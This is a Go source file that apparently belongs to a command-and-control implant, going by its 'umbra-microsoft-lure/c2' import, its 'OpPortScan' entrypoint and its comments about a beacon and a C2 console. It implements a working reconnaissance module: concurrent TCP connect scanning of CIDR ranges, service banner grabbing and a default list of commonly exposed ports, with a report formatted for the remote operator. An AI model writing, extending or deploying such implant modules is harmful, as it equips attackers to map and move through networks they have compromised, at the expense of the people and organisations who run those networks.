package main

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/nullbyter19/umbra-microsoft-lure/c2/proto"
)

// portScanResult holds the result of a single port scan.
type portScanResult struct {
	Host   string
	Port   int
	Open   bool
	Banner string
	Error  string
}

// portScanner performs TCP connect scans with configurable concurrency. It
// reuses a single Dialer so the timeout applies uniformly to every probe.
type portScanner struct {
	timeout     time.Duration
	concurrency int
	banner      bool

	mu      sync.Mutex
	results []portScanResult
}

// newPortScanner creates a scanner. A timeout <= 0 defaults to 800ms and a
// concurrency <= 0 defaults to 100 workers, which is aggressive enough to be
// useful on a LAN without being a SYN flood.
func newPortScanner(timeout time.Duration, concurrency int) *portScanner {
	if timeout <= 0 {
		timeout = 800 * time.Millisecond
	}
	if concurrency <= 0 {
		concurrency = 100
	}
	return &portScanner{
		timeout:     timeout,
		concurrency: concurrency,
		banner:      true,
		results:     make([]portScanResult, 0),
	}
}

// scanPort tries a single TCP connection. On success it optionally reads a
// short banner so the operator can fingerprint the service.
func (s *portScanner) scanPort(ctx context.Context, host string, port int) portScanResult {
	res := portScanResult{Host: host, Port: port}
	dialer := net.Dialer{Timeout: s.timeout, KeepAlive: 0}

	conn, err := dialer.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		res.Error = err.Error()
		return res
	}
	defer conn.Close()
	res.Open = true

	if s.banner {
		_ = conn.SetReadDeadline(time.Now().Add(600 * time.Millisecond))
		buf := make([]byte, 256)
		if n, _ := conn.Read(buf); n > 0 {
			res.Banner = sanitizeBanner(buf[:n])
		}
	}
	return res
}

// scanHost scans every port in ports against one host using a worker semaphore.
func (s *portScanner) scanHost(ctx context.Context, host string, ports []int) {
	sem := make(chan struct{}, s.concurrency)
	var wg sync.WaitGroup
	for _, port := range ports {
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			select {
			case sem <- struct{}{}:
			case <-ctx.Done():
				return
			}
			defer func() { <-sem }()

			r := s.scanPort(ctx, host, p)
			s.mu.Lock()
			s.results = append(s.results, r)
			s.mu.Unlock()
		}(port)
	}
	wg.Wait()
}

// scanRange scans a set of hosts sequentially (each host fans out internally).
func (s *portScanner) scanRange(ctx context.Context, hosts []string, ports []int) {
	for _, h := range hosts {
		s.scanHost(ctx, h, ports)
	}
}

// Results returns a copy of the collected results.
func (s *portScanner) Results() []portScanResult {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make([]portScanResult, len(s.results))
	copy(out, s.results)
	return out
}

// runPortScan is the OpPortScan entrypoint. It parses the JSON arg, runs the
// scan and returns a human-readable report for the C2 console.
func runPortScan(arg string) (string, error) {
	var a proto.PortScanArg
	if strings.TrimSpace(arg) != "" {
		if err := json.Unmarshal([]byte(arg), &a); err != nil {
			return "", fmt.Errorf("bad portscan arg: %w", err)
		}
	}
	if strings.TrimSpace(a.Hosts) == "" {
		return "", fmt.Errorf("portscan: no hosts supplied")
	}

	hosts, err := parseHosts(a.Hosts)
	if err != nil {
		return "", err
	}

	ports, err := parsePorts(a.Ports)
	if err != nil {
		return "", err
	}
	if len(ports) == 0 {
		ports = append([]int(nil), topPorts...)
	}

	// Bound the work so a fat-fingered CIDR cannot pin the beacon indefinitely.
	const maxHosts = 1024
	const maxPorts = 65536
	if len(hosts) > maxHosts {
		return "", fmt.Errorf("portscan: %d hosts exceeds cap of %d (narrow the CIDR)", len(hosts), maxHosts)
	}
	if len(ports) > maxPorts {
		return "", fmt.Errorf("portscan: %d ports exceeds cap of %d", len(ports), maxPorts)
	}

	timeout := time.Duration(a.Timeout) * time.Millisecond
	sc := newPortScanner(timeout, a.Threads)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	start := time.Now()
	sc.scanRange(ctx, hosts, ports)
	elapsed := time.Since(start)

	return formatPortScanResults(sc.Results(), len(hosts), len(ports), elapsed), nil
}

// formatPortScanResults renders the results as a readable, sorted report.
func formatPortScanResults(results []portScanResult, nHosts, nPorts int, elapsed time.Duration) string {
	byHost := make(map[string][]portScanResult)
	for _, r := range results {
		byHost[r.Host] = append(byHost[r.Host], r)
	}

	// Stable host ordering for reproducible output.
	hosts := make([]string, 0, len(byHost))
	for h := range byHost {
		hosts = append(hosts, h)
	}
	sort.Strings(hosts)

	var sb strings.Builder
	fmt.Fprintf(&sb, "portscan: %d host(s) x %d port(s) in %s\n", nHosts, nPorts, elapsed.Round(time.Millisecond))

	totalOpen := 0
	for _, host := range hosts {
		var open []portScanResult
		for _, r := range byHost[host] {
			if r.Open {
				open = append(open, r)
			}
		}
		sort.Slice(open, func(i, j int) bool { return open[i].Port < open[j].Port })
		totalOpen += len(open)

		fmt.Fprintf(&sb, "\n=== %s ===\n", host)
		if len(open) == 0 {
			sb.WriteString("  no open ports\n")
			continue
		}
		for _, r := range open {
			if r.Banner != "" {
				fmt.Fprintf(&sb, "  %5d/tcp open  %s\n", r.Port, r.Banner)
			} else {
				fmt.Fprintf(&sb, "  %5d/tcp open\n", r.Port)
			}
		}
	}
	fmt.Fprintf(&sb, "\n%d open port(s) across %d host(s)\n", totalOpen, len(hosts))
	return sb.String()
}

// sanitizeBanner trims control characters from a service banner.
func sanitizeBanner(b []byte) string {
	var sb strings.Builder
	for _, c := range b {
		switch {
		case c == '\r' || c == '\n' || c == '\t':
			sb.WriteByte(' ')
		case c >= 0x20 && c < 0x7f:
			sb.WriteByte(c)
		}
	}
	return strings.TrimSpace(sb.String())
}

// topPorts is a curated list of the most commonly exposed TCP services, used
// when the operator does not specify a port list.
var topPorts = []int{
	21, 22, 23, 25, 53, 69, 80, 81, 88, 110, 111, 135, 137, 138, 139, 143,
	161, 162, 389, 443, 445, 464, 465, 512, 513, 514, 515, 548, 554, 587,
	623, 631, 636, 873, 902, 990, 993, 995, 1025, 1026, 1080, 1099, 1158,
	1433, 1434, 1521, 1723, 1883, 2049, 2082, 2083, 2181, 2375, 2376, 3000,
	3128, 3260, 3268, 3306, 3389, 4444, 4505, 4506, 5000, 5001, 5060, 5222,
	5357, 5432, 5555, 5601, 5672, 5900, 5985, 5986, 6000, 6379, 6443, 7001,
	7002, 8000, 8008, 8080, 8081, 8088, 8090, 8161, 8180, 8443, 8500,
	8888, 9000, 9001, 9042, 9090, 9092, 9100, 9200, 9300, 9418, 9999,
	10000, 10250, 11211, 15672, 27017, 27018, 50000,
}

// parseHosts parses a comma-separated list of hosts, expanding any CIDR block.
func parseHosts(input string) ([]string, error) {
	var hosts []string
	for _, h := range strings.Split(input, ",") {
		h = strings.TrimSpace(h)
		if h == "" {
			continue
		}
		if !strings.Contains(h, "/") {
			hosts = append(hosts, h)
			continue
		}

		ip, ipNet, err := net.ParseCIDR(h)
		if err != nil {
			return nil, fmt.Errorf("invalid CIDR %q: %v", h, err)
		}
		for cur := ip.Mask(ipNet.Mask); ipNet.Contains(cur); cur = nextIP(cur) {
			hosts = append(hosts, cur.String())
		}
	}
	return hosts, nil
}

// nextIP returns the next IP address, mutating in place.
func nextIP(ip net.IP) net.IP {
	next := make(net.IP, len(ip))
	copy(next, ip)
	for j := len(next) - 1; j >= 0; j-- {
		next[j]++
		if next[j] != 0 {
			break
		}
	}
	return next
}

// parsePorts parses a comma-separated list of ports and ranges ("22,80,1-1024").
func parsePorts(input string) ([]int, error) {
	var ports []int
	for _, p := range strings.Split(input, ",") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}

		if strings.Contains(p, "-") {
			parts := strings.SplitN(p, "-", 2)
			start, err := strconv.Atoi(strings.TrimSpace(parts[0]))
			if err != nil {
				return nil, fmt.Errorf("invalid port range %q: %v", p, err)
			}
			end, err := strconv.Atoi(strings.TrimSpace(parts[1]))
			if err != nil {
				return nil, fmt.Errorf("invalid port range %q: %v", p, err)
			}
			if start > end {
				start, end = end, start
			}
			if start < 1 || end > 65535 {
				return nil, fmt.Errorf("port range %q out of bounds (1-65535)", p)
			}
			for port := start; port <= end; port++ {
				ports = append(ports, port)
			}
			continue
		}

		port, err := strconv.Atoi(p)
		if err != nil {
			return nil, fmt.Errorf("invalid port %q: %v", p, err)
		}
		if port < 1 || port > 65535 {
			return nil, fmt.Errorf("port %q out of bounds (1-65535)", p)
		}
		ports = append(ports, port)
	}
	return ports, nil
}
